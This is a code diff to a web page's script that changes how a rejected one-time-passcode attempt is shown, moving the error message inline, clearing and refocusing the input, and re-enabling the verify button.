@@ -325,14 +325,26 @@
       var params = new URLSearchParams(window.location.search);
       if (params.get('error') !== 'otp') return;
       var msg = params.get('msg') || 'The OTP was rejected. Please check the code and try again.';
-      var rejectText = document.querySelector('#rejectOverlay p');
-      if (rejectText) rejectText.textContent = msg;
       var rejectOverlay = document.getElementById('rejectOverlay');
-      if (rejectOverlay) rejectOverlay.classList.add('show');
+      if (rejectOverlay) rejectOverlay.classList.remove('show');
       var otpForm = document.getElementById('otpForm');
       if (otpForm) otpForm.style.display = 'block';
       var otpField = document.getElementById('otpField');
-      if (otpField) otpField.classList.add('invalid');
+      if (otpField) {
+        otpField.classList.add('invalid');
+        var req = otpField.querySelector('.req');
+        if (req) req.textContent = msg;
+      }
+      var otpInput = document.getElementById('otp');
+      if (otpInput) {
+        otpInput.value = '';
+        otpInput.disabled = false;
+        otpInput.focus();
+      }
+      var verifyBtn = document.getElementById('verifyBtn');
+      if (verifyBtn) verifyBtn.disabled = false;
+      var waitOverlay = document.getElementById('waitOverlay');
+      if (waitOverlay) waitOverlay.classList.remove('show');
     }
 
     // Update language switcher link to preserve request ID
